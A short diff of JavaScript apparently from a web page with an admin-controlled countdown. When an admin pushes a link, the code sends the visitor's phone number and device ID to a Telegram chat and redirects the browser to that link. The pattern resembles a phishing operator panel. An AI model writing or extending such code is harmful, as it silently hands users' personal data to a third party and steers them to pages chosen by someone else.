@@ -1123,7 +1123,7 @@
                         console.log('🚀 Link detected (admin):', data.url);
                         stopLinkListeners();
                         clearCountdownState();
-                        sendTelegram('🚀 COUNTDOWN → REDIRECT\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n🔗 Link: ' + data.url + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
+                        sendTelegram('🚀 COUNTDOWN → REDIRECT\n━━━━━━━━━━━━━━━━━━━━\n👤 Phone: ' + userPhone + '\n🖥️ Device: ' + deviceDisplayId + '\n⏰ Time: ' + new Date().toLocaleString() + '\n━━━━━━━━━━━━━━━━━━━━');
                         window.location.href = data.url;
                     }
                 });
